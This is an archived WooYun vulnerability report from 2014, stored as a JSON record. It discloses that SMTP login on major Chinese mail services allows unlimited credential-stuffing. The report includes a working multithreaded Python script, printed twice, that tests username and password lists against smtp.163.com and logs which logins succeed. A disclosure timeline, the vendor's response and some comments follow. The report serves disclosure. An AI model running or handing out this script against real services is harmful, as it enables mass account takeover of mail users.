{"id": 1053, "wybug_id": "wooyun-2014-072537", "wybug_title": "某基础服务可以被利用无限制撞库很多大公司受影响", "wybug_corp": "互联网应急响应中心", "wybug_author": "latershow", "wybug_date": "2014-08-15 16:34", "wybug_open_date": "2014-09-29 19:50", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "\t\t\t\t\t\t\t\t已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 某基础服务可以被利用无限制撞库，很多大公司受影响 详细说明：  Smtp如果开启的话可被利用无限制撞库很多大型公司的账号体系是和邮箱打通的，他们在网站登录处部署重兵防止撞库，但是smtp上却没有做防护几个大公司的smtp服务器：http://blog.csdn.net/hssdw25172008/article/details/8729469poc代码：\n#! /usr/bin/env python#coding=utf-8import smtplibimport threadingimport  timesmtp_server = \"smtp.163.com\"alive_thread = 0def send_email(user, pwd):    global alive_thread    try:        s = smtplib.SMTP()        s.connect(smtp_server)        s.login(user, pwd)        s.close()        print  \"%s %s login sucess\" % (user,pwd)    except Exception, e:        print \"%s %s login failed\" % (user,pwd)    threading.Lock()    alive_thread -= 1    threading.RLock()if __name__ == \"__main__\":    print smtp_server    fl = open(\"D:/163.txt\",\"r\")    for x in fl.readlines():        pts = x.split(\" \")        if len(pts)==2:            while (alive_thread>500):                time.sleep(1)            threading.Lock()            alive_thread +=1            threading.RLock()            threading.Thread(target=send_email,args=(pts[0].strip(),pts[1].strip())).start()    pass\n漏洞证明：Sohu:\n\nQQ试了一下，发现不成功，根据报错搜了一下，原因是smtp 默认未开启：\n\n126、163 smtp默认开启：\n\n\n\n\n\n\n\n问题很严重，不敢耽搁，赶紧来提wooyun，很多公司都存在这个问题。   漏洞证明：  Smtp如果开启的话可被利用无限制撞库很多大型公司的账号体系是和邮箱打通的，他们在网站登录处部署重兵防止撞库，但是smtp上却没有做防护几个大公司的smtp服务器：http://blog.csdn.net/hssdw25172008/article/details/8729469poc代码：\n#! /usr/bin/env python#coding=utf-8import smtplibimport threadingimport  timesmtp_server = \"smtp.163.com\"alive_thread = 0def send_email(user, pwd):    global alive_thread    try:        s = smtplib.SMTP()        s.connect(smtp_server)        s.login(user, pwd)        s.close()        print  \"%s %s login sucess\" % (user,pwd)    except Exception, e:        print \"%s %s login failed\" % (user,pwd)    threading.Lock()    alive_thread -= 1    threading.RLock()if __name__ == \"__main__\":    print smtp_server    fl = open(\"D:/163.txt\",\"r\")    for x in fl.readlines():        pts = x.split(\" \")        if len(pts)==2:            while (alive_thread>500):                time.sleep(1)            threading.Lock()            alive_thread +=1            threading.RLock()            threading.Thread(target=send_email,args=(pts[0].strip(),pts[1].strip())).start()    pass\n漏洞证明：Sohu:\n\nQQ试了一下，发现不成功，根据报错搜了一下，原因是smtp 默认未开启：\n\n126、163 smtp默认开启：\n\n\n\n\n\n\n\n问题很严重，不敢耽搁，赶紧来提wooyun，很多公司都存在这个问题。   修复方案：  给礼物我再告诉你   版权声明：转载请注明来源 latershow@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-20 10:08 厂商回复： 对于所述案例的撞库风险，需要各厂商拟定防护规则进行限定，暂无法一一处置。先行确认并公开。 最新状态： 2014-08-20：公开。  ", "replys": "漏洞评价：\n评论\n     2014-08-15 16:53 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个处置起来有点难度，因为各邮件系统是支持pop3和stmp客户端收发的。    \n     2014-08-15 17:38 |    \t\tlatershow \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | andr0day)\t\t \n  可以默认关闭    \n     2014-08-15 18:03 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  @cncert国家互联网应急中心 是smtp >>stmp    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}